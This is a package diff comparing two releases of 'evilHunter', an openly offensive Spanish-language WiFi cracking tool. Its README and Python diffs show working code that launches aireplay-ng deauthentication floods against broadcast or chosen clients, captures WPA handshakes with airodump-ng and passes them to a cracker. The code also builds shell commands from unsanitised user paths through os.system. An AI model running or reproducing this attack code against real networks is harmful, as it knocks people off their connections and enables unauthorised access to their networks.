# Comparing `tmp/evilHunter-0.1.9.47.tar.gz` & `tmp/evilHunter-0.1.9.50.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilHunter-0.1.9.47.tar", last modified: Sun Jun 25 11:18:44 2023, max compression
+gzip compressed data, was "evilHunter-0.1.9.50.tar", last modified: Thu Jun 29 08:28:48 2023, max compression
```

## Comparing `evilHunter-0.1.9.47.tar` & `evilHunter-0.1.9.50.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-25 11:18:44.847196 evilHunter-0.1.9.47/
--rw-r--r--   0 root         (0) root         (0)     2653 2023-06-25 11:18:44.847196 evilHunter-0.1.9.47/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)     2420 2023-06-22 19:13:13.000000 evilHunter-0.1.9.47/README.md
--rw-r--r--   0 root         (0) root         (0)     4212 2023-06-23 14:59:42.000000 evilHunter-0.1.9.47/evilCracker.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-25 11:18:44.847196 evilHunter-0.1.9.47/evilHunter.egg-info/
--rw-r--r--   0 root         (0) root         (0)     2653 2023-06-25 11:18:44.000000 evilHunter-0.1.9.47/evilHunter.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      216 2023-06-25 11:18:44.000000 evilHunter-0.1.9.47/evilHunter.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-06-25 11:18:44.000000 evilHunter-0.1.9.47/evilHunter.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       14 2023-06-25 11:18:44.000000 evilHunter-0.1.9.47/evilHunter.egg-info/requires.txt
--rw-r--r--   0 root         (0) root         (0)        6 2023-06-25 11:18:44.000000 evilHunter-0.1.9.47/evilHunter.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)    31766 2023-06-25 11:16:30.000000 evilHunter-0.1.9.47/evilHunter.py
--rw-r--r--   0 root         (0) root         (0)       38 2023-06-25 11:18:44.847196 evilHunter-0.1.9.47/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      558 2023-06-25 11:18:32.000000 evilHunter-0.1.9.47/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-29 08:28:48.869069 evilHunter-0.1.9.50/
+-rw-r--r--   0 root         (0) root         (0)     2721 2023-06-29 08:28:48.869069 evilHunter-0.1.9.50/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)     2488 2023-06-28 19:11:54.000000 evilHunter-0.1.9.50/README.md
+-rw-r--r--   0 root         (0) root         (0)     4212 2023-06-23 14:59:42.000000 evilHunter-0.1.9.50/evilCracker.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-29 08:28:48.869069 evilHunter-0.1.9.50/evilHunter.egg-info/
+-rw-r--r--   0 root         (0) root         (0)     2721 2023-06-29 08:28:48.000000 evilHunter-0.1.9.50/evilHunter.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      216 2023-06-29 08:28:48.000000 evilHunter-0.1.9.50/evilHunter.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-06-29 08:28:48.000000 evilHunter-0.1.9.50/evilHunter.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       14 2023-06-29 08:28:48.000000 evilHunter-0.1.9.50/evilHunter.egg-info/requires.txt
+-rw-r--r--   0 root         (0) root         (0)        6 2023-06-29 08:28:48.000000 evilHunter-0.1.9.50/evilHunter.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)    31953 2023-06-28 19:16:09.000000 evilHunter-0.1.9.50/evilHunter.py
+-rw-r--r--   0 root         (0) root         (0)       38 2023-06-29 08:28:48.869069 evilHunter-0.1.9.50/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      558 2023-06-28 19:11:54.000000 evilHunter-0.1.9.50/setup.py
```

### Comparing `evilHunter-0.1.9.47/PKG-INFO` & `evilHunter-0.1.9.50/PKG-INFO`

 * *Files 6% similar despite different names*

```diff
@@ -1,22 +1,22 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.9.47
+Version: 0.1.9.50
 Summary: Cracking WiFi(KCRACK)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
 
 NOVEDADES:
         
         ¡Ahora puedes atacar a mas de 1 cliente!
-        Optimización de código
+         Correcion de pequeños bugs
 
 Argumentos:
      
         
         [♦] evilHunter [-w /path/to/wordlists] [-b 12 (passwd length)] [-t 400 (Nº of threads)]
         
             (-w / --wordlist)
@@ -81,14 +81,16 @@
 
     2. Escaneamos redes cercanas para guardar información sobre:
 
                 · ESSID/NOMBRE DE RED
                 · Cifrado
                 · BSSID
                 · Canal/Channel
+                · Clientes
+                · Power ( Señal )
 
 
     3. A la vez que estamos escaneando esa red fijando la tarjeta de
         red en el mismo canal, enviamos paquetes de deautenticación 
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
```

### Comparing `evilHunter-0.1.9.47/README.md` & `evilHunter-0.1.9.50/README.md`

 * *Files 5% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 # evilHunter
 
 NOVEDADES:
         
         ¡Ahora puedes atacar a mas de 1 cliente!
-        Optimización de código
+         Correcion de pequeños bugs
 
 Argumentos:
      
         
         [♦] evilHunter [-w /path/to/wordlists] [-b 12 (passwd length)] [-t 400 (Nº of threads)]
         
             (-w / --wordlist)
@@ -72,14 +72,16 @@
 
     2. Escaneamos redes cercanas para guardar información sobre:
 
                 · ESSID/NOMBRE DE RED
                 · Cifrado
                 · BSSID
                 · Canal/Channel
+                · Clientes
+                · Power ( Señal )
 
 
     3. A la vez que estamos escaneando esa red fijando la tarjeta de
         red en el mismo canal, enviamos paquetes de deautenticación 
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
```

### Comparing `evilHunter-0.1.9.47/evilCracker.py` & `evilHunter-0.1.9.50/evilCracker.py`

 * *Files identical despite different names*

### Comparing `evilHunter-0.1.9.47/evilHunter.egg-info/PKG-INFO` & `evilHunter-0.1.9.50/evilHunter.egg-info/PKG-INFO`

 * *Files 6% similar despite different names*

```diff
@@ -1,22 +1,22 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.9.47
+Version: 0.1.9.50
 Summary: Cracking WiFi(KCRACK)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
 
 NOVEDADES:
         
         ¡Ahora puedes atacar a mas de 1 cliente!
-        Optimización de código
+         Correcion de pequeños bugs
 
 Argumentos:
      
         
         [♦] evilHunter [-w /path/to/wordlists] [-b 12 (passwd length)] [-t 400 (Nº of threads)]
         
             (-w / --wordlist)
@@ -81,14 +81,16 @@
 
     2. Escaneamos redes cercanas para guardar información sobre:
 
                 · ESSID/NOMBRE DE RED
                 · Cifrado
                 · BSSID
                 · Canal/Channel
+                · Clientes
+                · Power ( Señal )
 
 
     3. A la vez que estamos escaneando esa red fijando la tarjeta de
         red en el mismo canal, enviamos paquetes de deautenticación 
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
```

### Comparing `evilHunter-0.1.9.47/evilHunter.py` & `evilHunter-0.1.9.50/evilHunter.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,8 @@
 #!/bin/python3
-# SUBIR A PYPI
-# Frenar deauth
 
 try:
     # Importamos librerias
     print("\n[*] Starting...")
     print("\n\t[*] Comprobando librerias...")
     import string
     import re
@@ -25,15 +23,15 @@
 
 except ModuleNotFoundError as e:
     print("\n\n[!] Faltan modulos necesario para la ejecucion...\n\t%s" % e)
     print("[!] Exiting...")
     exit(1)
 
 #
-# Añadir el ataque a más de 1 cliente ( select_client() )
+# Solo queda comprobar un poco y subirlo a git y a pypi
 #
 
 
 def delete_files():
     # Borramos archivos innnecesarios
     os.system('find /home/EvilHunter_Data/captures -type f ! -name "*.cap" -delete > /dev/null')
     os.system('rm /home/EvilHunter_Data/espec/*')
@@ -50,23 +48,23 @@
     if os.system("airmon-ng stop {} > /dev/null".format(interface)) != 0:
         os.system("airmon-ng stop {} > /dev/null".format(interface))
 
 
 def exiting(err):
     # Salida con o sin error
     if err:
-        if err is True:
-            print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n", err)
-
-        elif err == "done":
+        if err == "done":
             print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting tool...")
 
         elif err is False:
             print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
 
+        else:
+            print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n", err)
+
     elif not err:
         print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
 
     print(
         Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
         Fore.LIGHTCYAN_EX + "Restoring mac address..." + Fore.RESET
 
@@ -578,15 +576,15 @@
 
     time.sleep(1)
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
           Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
           Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)
 
     input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")
-
+    time.sleep(0.2)
     capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch,
                                                                file, network_to_attack, attack_client))
 
     # Iniciamos la captura del handshake y envio de deauth
     capture.start()
 
     # Juntamos para detener
@@ -662,76 +660,83 @@
         print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Cliente encontrado! -->", client)
         clients_to_attack.append(clients[client])
         time.sleep(0.5)
 
     return clients_to_attack
 
 
-def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_client):
+def  capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_client):
+    global pids
     if not os.path.exists(f"/home/EvilHunter_Data/captures/{network_to_attack}/"):
         os.makedirs(f"/home/EvilHunter_Data/captures/{network_to_attack}/")
 
     hand = subprocess.Popen(["airodump-ng", "-w", f"/home/EvilHunter_Data/captures/{network_to_attack}/"
                              + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
 
     threads = []
+    pids = []
     # Si tenemos cliente  para atacar:
     if attack_client is not None:   # 1 solo client
         if len(attack_client) == 1:
             time.sleep(0.2)
-            thread = threading.Thread(target=deauth_client, args=(bssid, attack_client[0]))
+            thread = threading.Thread(target=deauth_client, args=(bssid, attack_client[0], pids))
             thread.start()
             threads.append(thread)
 
         elif len(attack_client) > 1:   # Mas de 1 clients
             for client in attack_client:
                 time.sleep(0.2)
-                thread = threading.Thread(target=deauth_client, args=(bssid, client))
+                thread = threading.Thread(target=deauth_client, args=(bssid, client, pids))
 
                 thread.start()
                 threads.append(thread)
 
     # Si no al broadcast
     elif attack_client is None:
-        subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
+        time.sleep(0.2)
+        thread = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
                          stdout=subprocess.DEVNULL)
+        pids.append(thread.pid)
 
     done = False
     while True:
         try:
             output = hand.stdout.readline()
             print(output.decode().strip())
             if "WPA handshake:".encode() in output:
                 time.sleep(0.2)
                 # Dejamos que se envien correctamente todos los paquetes
                 done = True
                 # Rompemos búcle
                 break
 
         except KeyboardInterrupt:
-            break
+            break 
 
     # Esperar a que todos los hilos terminen
     if threads:
-        for thread in threads:
-            thread.join()
+        for pid in pids:
+            os.kill(pid, 9)
+    else:
+        os.kill(pids[0], 9)
 
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
         print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...")
     else:
         print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
         exiting(err=True)
     crack_handshake(direc, args, file, network_to_attack)
 
 
-def deauth_client(bssid, client):
-    subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, '-c', client, interface], stdout=subprocess.DEVNULL)
-
+def deauth_client(bssid, client, pids):
+    deauth = subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, '-c', client, interface],
+                              stdout=subprocess.DEVNULL)
+    pids.append(deauth.pid)
 
 def find_wordlists(wordlists):
     found = os.system("find {} > /dev/null".format(wordlists))
     while found != 0:
         print(Fore.YELLOW + "[!] " + Fore.RED + "Diccionario no encontrado, introduzca la ruta completa...")
         wordlists = input(Fore.YELLOW + "\n\t[!>] " + Fore.WHITE)
         found = os.system("find {}  > /dev/null".format(wordlists))
```

### Comparing `evilHunter-0.1.9.47/setup.py` & `evilHunter-0.1.9.50/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from setuptools import setup
 
 with open("README.md", "r", encoding="utf-8") as fh:
     long_description = fh.read()
 
 setup(
     name="evilHunter",
-    version="0.1.9.47",
+    version="0.1.9.50",
     description="Cracking WiFi(KCRACK)",
     long_description=long_description,
     long_description_content_type="text/markdown",
     author="an0mal1a",
     url="https://github.com/an0mal1a/evilHunter",
     author_email="pablodiez024@proton.me",
     packages=["words"],
```

